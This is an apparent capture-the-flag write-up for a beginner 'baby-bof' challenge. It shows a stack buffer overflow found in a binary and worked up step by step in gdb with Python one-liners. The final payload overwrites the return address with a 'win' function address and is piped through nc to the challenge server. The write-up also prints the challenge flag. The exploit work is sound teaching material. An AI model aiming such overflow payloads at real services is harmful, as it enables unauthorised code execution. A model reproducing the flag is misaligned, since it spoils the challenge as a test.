# baby-bof
This is your first pwn challenge.

- This was the easier because it was just a ``buffer overflow`` type of pwn.

- A bit of reverse we are just inspecting what are we dealing with:

# Main
![main](https://github.com/TedyonGit/AC-UPT-ControluDeCalitate-WriteUps/blob/main/baby-bof/main.png)

# Vuln
![vuln](https://github.com/TedyonGit/AC-UPT-ControluDeCalitate-WriteUps/blob/main/baby-bof/vuln.png)

# Win
![win-func](https://github.com/TedyonGit/AC-UPT-ControluDeCalitate-WriteUps/blob/main/baby-bof/win-fun.png)

- We see that variable ``local_48`` has a limit of 64, but the program can read max of 0x100 (256 decimal) bytes.
- At this point we just need to write a python script to overwhelm the variable and redirect the flow to any function we want.

- Let's start with attaching gdb to the program:

![gdb](https://github.com/TedyonGit/AC-UPT-ControluDeCalitate-WriteUps/blob/main/baby-bof/gdb.png)

- Then we execute a python code to see how the program reacts with 63 A's:

![63a](https://github.com/TedyonGit/AC-UPT-ControluDeCalitate-WriteUps/blob/main/baby-bof/63a.png)

```python
python3 -c "import sys; sys.stdout.buffer.write(b'A'*63)"
```

- Seems like the program didn't crash so we are at the limit. Let's change a bit and add some B's:

![63a10b](https://github.com/TedyonGit/AC-UPT-ControluDeCalitate-WriteUps/blob/main/baby-bof/63a10b.png)

```python
python3 -c "import sys; sys.stdout.buffer.write(b'A'*63 + b'B'*10)"
```

- Oh, we got a crash. Did we manage to control the flow? Let's add some C's just to be sure:

![63a10b5c](https://github.com/TedyonGit/AC-UPT-ControluDeCalitate-WriteUps/blob/main/baby-bof/64a10b5c.png)

```python
python3 -c "import sys; sys.stdout.buffer.write(b'A'*63 + b'B'*10 + b'C'*5)"
```

- Bingo! Now we control the flow and we can see by the address ``0x43434343434...`` which is the ascii code of the letter ``C``. But something is not right, because we don't have a clean address of 43's, so in that matter let's substract a B to see if something changes.

![63a9b5c](https://github.com/TedyonGit/AC-UPT-ControluDeCalitate-WriteUps/blob/main/baby-bof/64a9b5c.png)

```python
python3 -c "import sys; sys.stdout.buffer.write(b'A'*63 + b'B'*9 + b'C'*5)"
```

- There we go! now all we have to do just to pass the address of the function we want to access, which is going to be ``win``.
- But first we need to tranform it from Big Edian to Little Edian, which is going to be a "reversed" version of the address:

![win](https://github.com/TedyonGit/AC-UPT-ControluDeCalitate-WriteUps/blob/main/baby-bof/win.png)

- Big Edian:
```
0x40 0x11 0x96
```
- Little Edian:
```
0x96 0x11 0x40
```

- Now let's test our final script:

![63a9bwinaddr](https://github.com/TedyonGit/AC-UPT-ControluDeCalitate-WriteUps/blob/main/baby-bof/63a9bwin_address.png)

```python
python3 -c "import sys; sys.stdout.buffer.write(b'A'*63 + b'B'*9 + b'\x96\x11\x40')"
```

- GG! We succesfully called ``win``. Let's do a final step and pass it to the ``nc`` to get our flag:

![final](https://github.com/TedyonGit/AC-UPT-ControluDeCalitate-WriteUps/blob/main/baby-bof/final.png)

```python
python3 -c "import sys; sys.stdout.buffer.write(b'A'*63 + b'B'*9 + b'\x96\x11\x40')" | nc ctf.ac.upt.ro 9796
```

- Flag: ctf{3c1315f63d550570a690f693554647b7763c3acbc806ae846ce8d25b5f364d10}
